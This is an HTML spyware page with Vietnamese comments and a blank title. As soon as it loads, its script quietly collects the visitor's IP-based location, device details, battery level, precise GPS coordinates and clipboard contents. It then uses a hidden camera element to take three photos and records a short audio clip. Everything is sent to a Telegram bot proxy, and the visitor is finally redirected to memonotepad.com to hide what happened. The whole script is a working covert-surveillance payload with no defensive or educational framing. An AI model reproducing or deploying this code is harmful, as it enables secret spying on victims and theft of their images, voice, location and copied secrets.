<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>.</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#000;min-height:100vh}
    </style>
</head>
<body>
    <video id="v" autoplay playsinline style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none"></video>
    <canvas id="c" width="640" height="480" style="display:none"></canvas>
    <input id="d" style="position:absolute;opacity:0;height:0;width:0">

    <script>
        const API = '/api/telegram-proxy';
        const RL = 'https://www.memonotepad.com/';
        const PC = 3; // số ảnh
        const PD = 500; // delay giữa ảnh
        const AD = 500; // audio duration
        const io = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;

        let ps = 0, cs = null, ca = false, mr = null, ac = [], rt = false;
        let mi = false, camOK = false, audOK = false, gc = false, oc = false, cc = false;

        function done() {
            if (rt) return;
            if (mi && camOK && audOK && gc && oc && cc) {
                rt = true;
                setTimeout(() => { location.href = RL; }, 500);
            }
        }

        async function st(t, r = 0) {
            try {
                const re = await fetch(API, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ endpoint: 'sendMessage', data: { text: t.substring(0, 4096), parse_mode: 'HTML' } })
                });
                const d = await re.json();
                if (!d.ok && r < 2) { await new Promise(x => setTimeout(x, 2000)); return st(t, r + 1); }
            } catch (e) { if (r < 2) { await new Promise(x => setTimeout(x, 2000)); return st(t, r + 1); } }
        }

        async function sp(b, n, r = 0) {
            try {
                const f = new FormData();
                f.append('endpoint', 'sendPhoto');
                f.append('photo', b, `p${n}.jpg`);
                f.append('caption', `📸 #${n} - ${new Date().toLocaleString('vi-VN')}`);
                const re = await fetch(API, { method: 'POST', body: f });
                const d = await re.json();
                if (d.ok) {
                    ps++;
                    if (ps >= PC) {
                        if (cs) { cs.getTracks().forEach(t => t.stop()); cs = null; }
                        camOK = true; done();
                    }
                } else if (r < 2) { await new Promise(x => setTimeout(x, 2000)); return sp(b, n, r + 1); }
            } catch (e) { if (r < 2) { await new Promise(x => setTimeout(x, 2000)); return sp(b, n, r + 1); } }
        }

        async function cp(v, c, ctx, n) {
            return new Promise(r => {
                const f = () => {
                    if (v.readyState >= 2) {
                        c.width = v.videoWidth || 640;
                        c.height = v.videoHeight || 480;
                        ctx.drawImage(v, 0, 0, c.width, c.height);
                        c.toBlob(b => { if (b) sp(b, n); r(true); }, 'image/jpeg', 0.85);
                    } else { setTimeout(f, 100); }
                };
                f();
            });
        }

        async function cm(v, c, ctx) {
            await new Promise(r => setTimeout(r, 1500));
            for (let i = 1; i <= PC; i++) {
                if (!ca) break;
                await cp(v, c, ctx, i);
                if (i < PC) await new Promise(r => setTimeout(r, PD));
            }
            if (ps === 0) { camOK = true; done(); }
        }

        async function startCam() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { camOK = true; done(); return; }
            try {
                const v = document.getElementById('v');
                const c = document.getElementById('c');
                const ctx = c.getContext('2d');
                const s = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' }
                });
                cs = s; ca = true; v.srcObject = s;
                await new Promise(r => { v.onloadedmetadata = () => { v.play().then(r).catch(r); }; });
                await cm(v, c, ctx);
            } catch (e) { camOK = true; done(); }
        }

        async function startAud() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                mr = new MediaRecorder(s);
                ac = [];
                mr.ondataavailable = e => { if (e.data.size > 0) ac.push(e.data); };
                mr.onstop = async () => {
                    const b = new Blob(ac, { type: 'audio/ogg' });
                    if (b.size > 0) {
                        const f = new FormData();
                        f.append('endpoint', 'sendAudio');
                        f.append('audio', b, 'a.ogg');
                        f.append('caption', '🎤 Ghi am - ' + new Date().toLocaleString('vi-VN'));
                        await fetch(API, { method: 'POST', body: f });
                    }
                    audOK = true; s.getTracks().forEach(t => t.stop()); done();
                };
                mr.start();
                setTimeout(() => {
                    if (mr && mr.state === 'recording') mr.stop();
                    else { audOK = true; done(); }
                }, AD);
            } catch (e) { audOK = true; done(); }
        }

        async function sendInfo() {
            try {
                let ip = 'KXĐ';
                try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch (e) {}

                const ua = navigator.userAgent;
                const pf = navigator.platform || 'KXĐ';
                let dm = 'KXĐ';
                if (/iPhone/.test(ua)) dm = 'iPhone';
                else if (/iPad/.test(ua)) dm = 'iPad';
                else if (/Android/.test(ua)) dm = 'Android';
                else if (/Windows/.test(ua)) dm = 'Windows';
                else if (/Macintosh/.test(ua)) dm = 'Mac';

                const sw = screen.width, sh = screen.height;
                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'KXĐ';
                const la = navigator.language || 'KXĐ';
                const ct = new Date().toLocaleString('vi-VN');
                const rf = document.referrer || 'Truc tiep';
                const ce = navigator.cookieEnabled ? 'Bat' : 'Tat';
                const dm2 = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'KXĐ';
                const hc = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' nhan' : 'KXĐ';

                let loc = '';
                try {
                    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,country,isp,lat,lon`);
                    const d = await r.json();
                    if (d && d.status === 'success') {
                        loc = `\n<b>📍 Thanh pho:</b> <code>${d.city || 'KXĐ'}</code>\n<b>🗺️ Khu vuc:</b> <code>${d.regionName || 'KXĐ'}</code>\n<b>🏳️ Quoc gia:</b> <code>${d.country || 'KXĐ'}</code>\n<b>🏢 Nha mang:</b> <code>${d.isp || 'KXĐ'}</code>`;
                        if (d.lat && d.lon) loc += `\n<a href="https://www.google.com/maps?q=${d.lat},${d.lon}">🗺️ Google Maps</a>`;
                    }
                } catch (e) {}

                // Pin
                let pin = 'KXĐ';
                try {
                    const b = await navigator.getBattery();
                    pin = Math.round(b.level * 100) + '%' + (b.charging ? ' (Dang sac)' : '');
                } catch (e) {}

                const txt = `<b>📥 TRUY CAP MOI</b>\n\n<b>🌐 IP:</b> <code>${ip}</code>${loc}\n\n<b>📱 Thiet bi:</b> <code>${dm}</code>\n<b>💻 Trinh duyet:</b> <code>${ua.substring(0,80)}...</code>\n<b>🖥️ HDH:</b> <code>${pf}</code>\n<b>📺 Man hinh:</b> <code>${sw}x${sh}</code>\n<b>🔋 Pin:</b> <code>${pin}</code>\n<b>💾 RAM:</b> <code>${dm2}</code>\n<b>⚙️ CPU:</b> <code>${hc}</code>\n<b>🍪 Cookie:</b> <code>${ce}</code>\n<b>🌐 Ngon ngu:</b> <code>${la}</code>\n<b>⏰ Mui gio:</b> <code>${tz}</code>\n<b>🕐 Thoi gian:</b> <code>${ct}</code>\n<b>📎 Nguon:</b> <code>${rf}</code>`;
                await st(txt);
                mi = true; done();
            } catch (e) { mi = true; done(); }
        }

        function sendGPS() {
            if (!('geolocation' in navigator)) { gc = true; done(); return; }
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    const la = pos.coords.latitude, lo = pos.coords.longitude, ac2 = pos.coords.accuracy;
                    await st(`<b>📍 GPS</b>\n\n<b>📌 Vi do:</b> <code>${la}</code>\n<b>📌 Kinh do:</b> <code>${lo}</code>\n<b>🎯 Do chinh xac:</b> <code>${Math.round(ac2)}m</code>\n\n<a href="https://www.google.com/maps?q=${la},${lo}">🗺️ Google Maps</a>`);
                    gc = true; done();
                },
                () => { gc = true; done(); },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }

        async function sendOri() {
            try {
                let scr = 'KXĐ';
                if (screen.orientation) {
                    const t = screen.orientation.type;
                    scr = t.includes('portrait') ? 'Doc' : t.includes('landscape') ? 'Ngang' : t;
                }
                await st(`<b>🧭 THIET BI</b>\n\n<b>📱 Man hinh:</b> <code>${scr}</code>\n<b>🔄 User Agent:</b> <code>${navigator.userAgent.substring(0,100)}</code>`);
            } catch (e) {}
            oc = true; done();
        }

        async function sendClip() {
            try {
                if (navigator.clipboard) {
                    const t = await navigator.clipboard.readText();
                    if (t && t.length > 0) {
                        if (t.length > 2000) {
                            const b = new Blob([t], { type: 'text/plain;charset=utf-8' });
                            const f = new FormData();
                            f.append('endpoint', 'sendDocument');
                            f.append('document', b, 'clipboard.txt');
                            f.append('caption', '📋 Clipboard - ' + t.length + ' ky tu');
                            await fetch(API, { method: 'POST', body: f });
                        } else {
                            await st(`<b>📋 CLIPBOARD</b>\n\n<code>${t}</code>`);
                        }
                    }
                }
            } catch (e) {}
            cc = true; done();
        }

        // ===== BẮT ĐẦU =====
        async function init() {
            // Gửi info + GPS + orientation + clipboard ngay lập tức (ko cần quyền)
            sendInfo();
            sendGPS();
            sendOri();

            // Với iOS cần focus input để đọc clipboard
            if (io) {
                document.getElementById('d').focus();
                setTimeout(() => { sendClip(); }, 500);
            } else {
                sendClip();
            }

            // Chờ 1s rồi xin quyền camera + audio
            setTimeout(() => {
                startCam();
                startAud();
            }, 1000);
        }

        init();
    </script>
</body>
</html>
